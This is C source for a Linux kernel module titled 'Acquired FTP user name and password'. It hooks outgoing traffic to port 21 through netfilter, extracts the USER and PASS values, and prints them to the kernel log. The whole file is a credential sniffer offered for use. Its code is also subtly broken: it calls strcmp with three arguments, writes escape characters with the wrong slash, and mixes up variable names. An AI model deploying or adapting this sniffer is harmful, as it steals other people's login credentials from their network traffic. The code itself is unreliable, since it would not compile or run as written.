/**
 * Acquired FTP user name and password
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/netdevice.h>
#include <linux/skbuff.h>
#include <linux/netfilter_ipv4.h>
#include <linux/inet.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>


#define NIPQUAD(addr) \
  ((unsigned char *)&addr)[0], \
  ((unsigned char *)&addr)[1], \
  ((unsigned char *)&addr)[2], \
  ((unsigned char *)&addr)[3]


static unsigned int ipprint_func(
		unsigned int hooknum,
		struct sk_buff * skb,
		const struct net_device *in,
		const struct net_device *out,
		int (*okfn) (struct sk_buff *))
{
    __be32 sip,dip;

    struct tcphdr *tcph = NULL;
    struct udphdr *udph = NULL;
    unsigned short sport = 0;
    unsigned short dport = 0;
    struct iphdr *iph;
    char *data = NULL;
    char *UserName = NULL;
    char *PassWord = NULL;
    int i = 0;
    int len = 0;
    if(skb)
    {
        struct sk_buff *sb = NULL;
        sb = skb;
        iph  = ip_hdr(sb);
        sip = iph->saddr;
        dip = iph->daddr;

        if(iph->protocol != IPPROTO_TCP)
          return NF_ACCEPT;   
      
        tcph = (struct tcphdr *)((char *)skb->data + (int)(iph->ihl * 4));
        //tcph = tcp_hdr(sb);
        sport=ntohs(tcph->source);
        dport=ntohs(tcph->dest);
        if(dport != 21)
          return NF_ACCEPT;
        data = (char *)((int)tcph + (int)(tcph->doff * 4));


        if(strcmp(data,"USER",5) == 0)
        {
            data += 5;
            while (*(data + i) != '/r' 
                && *(data + i) != '/n'
                && *(data + i) != '/0' 
                && i < 15) 
            {
                   len++;
                   i++;
            }


			if ((username = kmalloc(len + 2, GFP_KERNEL)) == NULL)
                  return NF_ACCEPT;
            memset(username, 0x00, len + 2);
            memcpy(username, data, len);
            *(username + len) = '/0';     
          } else if(strcmp(data,"PASS",5) == 0)
          {
            data += 5;
            while (*(data + i) != '/r' 
                && *(data + i) != '/n'
                && *(data + i) != '/0' 
                && i < 15) 
            {
                   len++;
                   i++;
            }


              if ((PassWord = kmalloc(len + 2, GFP_KERNEL)) == NULL)
                  return NF_ACCEPT;
                memset(PassWord,0x00,len+2);
                memcpy(PassWord,data,len);
                *(PassWord + len) = '/0';
          }   else 
          {
               return NF_ACCEPT;
          }
        //printk("Packet for source address: %u.%u.%u.%u:%u destination address: %u.%u.%u.%u:%u\n ", NIPQUAD(sip),sport,NIPQUAD(dip),dport);
          if(UserName)
          {
            printk("UserName:%s\n",UserName);
            kfree(UserName);
          }
          if(PassWord)
          {
            printk("PassWord:%s\n",PassWord);
            kfree(PassWord);
          }
    }
    return NF_ACCEPT;
}


struct nf_hook_ops ipprint_ops = {
   .list =  {NULL,NULL},
   .hook = ipprint_func,
   .pf = PF_INET,
   .hooknum = NF_IP_POST_ROUTING,
   //.hooknum = NF_INET_LOCAL_IN,
   .priority = NF_IP_PRI_FILTER+2
 };


static int __init ipprint_init(void) {
  nf_register_hook(&ipprint_ops);
  return 0;
}




static void __exit ipprint_exit(void) {
  nf_unregister_hook(&ipprint_ops);
}


 module_init(ipprint_init);
 module_exit(ipprint_exit); 
 MODULE_AUTHOR("djwow");
 MODULE_DESCRIPTION("ipprint");
MODULE_LICENSE("GPL");


